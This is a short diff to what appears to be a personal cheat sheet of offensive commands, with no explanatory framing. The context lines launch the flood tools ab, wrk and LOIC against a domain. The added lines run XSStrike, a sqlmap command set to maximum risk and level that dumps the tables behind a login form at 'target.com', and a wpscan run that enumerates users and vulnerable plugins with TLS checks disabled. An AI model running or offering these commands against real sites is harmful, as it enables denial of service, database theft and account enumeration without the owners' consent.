@@ -274,3 +274,18 @@ ab -n 10000 -c 100 https://yourdomain.com &
 wrk -t12 -c100 -d30s https://yourdomain.com &
 mono LOIC.exe &
 
+XSS
+python3 xsstrike.py -u "https://example.com./?s=scan&post_type=product"
+
+SQL
+sqlmap -u "https://target.com/mi-cuenta/" \
+--data="username=admin&password=admin&login=Iniciar sesion" \
+--batch --dump --tables --risk=3 --level=5
+
+WP weeb
+wpscan --url https://example.com/ \  
+  --api-token <your tokin> \
+  --enumerate u,vp \
+  --random-user-agent \
+  --disable-tls-checks \
+  --force 
